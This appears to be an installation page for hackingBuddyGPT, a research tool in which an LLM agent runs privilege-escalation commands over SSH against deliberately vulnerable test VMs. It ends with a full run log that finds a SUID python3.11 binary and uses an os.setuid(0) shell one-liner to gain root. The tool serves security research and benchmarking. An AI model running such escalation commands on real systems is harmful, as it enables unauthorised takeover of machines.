---
title: Installation
nextjs:
  metadata:
    title: Installation
    description: Learn how to setup hackingBuddyGPT, provide it a connection to a target system and, finally, hack some stuff.
---

We will guide you for project setup, creating suitable test targets and, finally, running hackingBuddyGPT against a test target.

## Preliminaries

For the sake of simplicity, we will be using a cloud-hosted OpenAI instance for this example.

For this, you will need an OpenAI API account. After setup, you can find the needed keys [in your account page](https://platform.openai.com/account/api-keys). Please note, that running out tool will call OpenAI and thus charges will occur to your account. Please keep track of those.

Currently, May 2024, running hackingBuddyGPT with `GPT-4-turbo` against a benchmark containing 13 VMs (with maximum 20 tries per VM) cost around $5. An alternative is using [Ollama](https://ollama.com/) locally through it's OpenAI-compatible API, but this depends upon possessing beefy NPU/GPUs.

## Installing up HackingBuddyGPT

HackingBuddyGPT can now be installed through pip, simplifying installation and updating. We will still use a `venv` based virtual python environment so that your installed python packages will not clash with the system's python packages:

```bash
# setup virtual python environment
$ python -m venv venv
$ source ./venv/bin/activate

# install hackingBuddyGPT
$ pip install hackingBuddyGPT

# Successfully installed hackingBuddyGPT-0.3.1
```

This will install two (identical) executable files: `wintermute` and `hackingBuddyGPT`.

Now you should be able to list the available agents through the `wintermute` command line tool which lists the available agents at the end:

```bash
$ wintermute
usage: wintermute [-h]
                  {LinuxPrivesc,WindowsPrivesc,ExPrivEscLinux,ExPrivEscLinuxTemplated,ExPrivEscLinuxHintFile,ExPrivEscLinuxLSE,MinimalWebTesting,WebTestingWithExplanation,SimpleWebAPITesting,SimpleWebAPIDocumentation}
                  ...
wintermute: error: the following arguments are required: {LinuxPrivesc,WindowsPrivesc,ExPrivEscLinux,ExPrivEscLinuxTemplated,ExPrivEscLinuxHintFile,ExPrivEscLinuxLSE,MinimalWebTesting,WebTestingWithExplanation,SimpleWebAPITesting,SimpleWebAPIDocumentation}
```

## Provide a Target Machine over SSH

The next important part is having a machine that we can run our agent against. In our case, the target machine will be situated at 192.168.122.151.

We are using vulnerable Linux systems running in Virtual Machines for this. Never run this against real systems.

{% callout title="We also provide vulnerable machines!" %}
We are using virtual machines from our [Linux Privilege-Escalation Benchmark](https://github.com/ipa-lab/benchmark-privesc-linux) project. Feel free to use them for your own research!
{% /callout %}

## Run the Hacking Agent

Finally we can run hackingBuddyGPT against our provided test VM. Enjoy!

{% callout type="warning" title="Don't be evil!" %}
Usage of hackingBuddyGPT for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.
{% /callout %}

With that out of the way, let's look at an example hackingBuddyGPT run. Each run is structured in rounds. At the start of each round, hackingBuddyGPT asks a LLM for the next command to execute (e.g., `whoami`) for the first round. It then executes that command on the virtual machine, prints its output and starts a new round (in which it also includes the output of prior rounds) until it reaches step number 10 or becomes root:


```bash
$ wintermute LinuxPrivesc --llm.api_key=sk...ChangeMeToYourOpenAiApiKey --llm.model=gpt-4-turbo --llm.context_size=8192 --conn.host=192.168.122.151 --conn.username=lowpriv --conn.password=trustno1 --conn.hostname=test1
[10:56:20] Starting turn 1 of 10                                               common_patterns.py:45
╭───────────────────────────────────── Got command from LLM: ──────────────────────────────────────╮
│ exec_command id                                                                                  │
╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
╭──────────────────────────────────────── exec_command id ─────────────────────────────────────────╮
│ uid=1001(lowpriv) gid=1001(lowpriv) groups=1001(lowpriv)                                         │
│                                                                                                  │
╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
[10:56:21] Starting turn 2 of 10                                               common_patterns.py:45
╭───────────────────────────────────── Got command from LLM: ──────────────────────────────────────╮
│ exec_command sudo -l                                                                             │
╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
╭────────────────────────────────────── exec_command sudo -l ──────────────────────────────────────╮
│ Sorry, user lowpriv may not run sudo on test-1.                                                  │
│                                                                                                  │
╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
[10:56:23] Starting turn 3 of 10                                               common_patterns.py:45
╭───────────────────────────────────── Got command from LLM: ──────────────────────────────────────╮
│ exec_command find / -perm -u=s -type f 2>/dev_code/null                                          │
╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
╭──────────────────── exec_command find / -perm -u=s -type f 2>/dev_code/null ─────────────────────╮
│ sh: 1: cannot create /dev_code/null: Directory nonexistent                                       │
│                                                                                                  │
╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
[10:56:24] Starting turn 4 of 10                                               common_patterns.py:45
╭───────────────────────────────────── Got command from LLM: ──────────────────────────────────────╮
│ exec_command find / -perm -u=s -type f 2>/dev/null                                               │
╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
╭─────────────────────── exec_command find / -perm -u=s -type f 2>/dev/null ───────────────────────╮
│ /usr/bin/newgrp                                                                                  │
│ /usr/bin/gpasswd                                                                                 │
│ /usr/bin/su                                                                                      │
│ /usr/bin/find                                                                                    │
│ /usr/bin/chfn                                                                                    │
│ /usr/bin/passwd                                                                                  │
│ /usr/bin/python3.11                                                                              │
│ /usr/bin/chsh                                                                                    │
│ /usr/bin/umount                                                                                  │
│ /usr/bin/sudo                                                                                    │
│ /usr/bin/mount                                                                                   │
│ /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                      │
│ /usr/lib/openssh/ssh-keysign                                                                     │
│                                                                                                  │
╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
[10:56:27] Starting turn 5 of 10                                               common_patterns.py:45
╭───────────────────────────────────── Got command from LLM: ──────────────────────────────────────╮
│ exec_command /usr/bin/python3.11 -c 'import os; os.system("/bin/sh")'                            │
╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
TIMEOUT! Could we have become root?
╭───────────── exec_command /usr/bin/python3.11 -c 'import os; os.system("/bin/sh")' ──────────────╮
│ $                                                                                                │
╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
[10:56:38] Starting turn 6 of 10                                               common_patterns.py:45
╭───────────────────────────────────── Got command from LLM: ──────────────────────────────────────╮
│ exec_command whoami                                                                              │
╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
╭────────────────────────────────────── exec_command whoami ───────────────────────────────────────╮
│ lowpriv                                                                                          │
│                                                                                                  │
╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
[10:56:39] Starting turn 7 of 10                                               common_patterns.py:45
╭───────────────────────────────────── Got command from LLM: ──────────────────────────────────────╮
│ exec_command /usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/sh")'              │
╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
TIMEOUT! Could we have become root?
╭────── exec_command /usr/bin/python3.11 -c 'import os; os.setuid(0); os.system("/bin/sh")' ───────╮
│ #                                                                                                │
╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
╭────────────────────────────────────────── Run finished ──────────────────────────────────────────╮
│ Got Root!                                                                                        │
╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
```
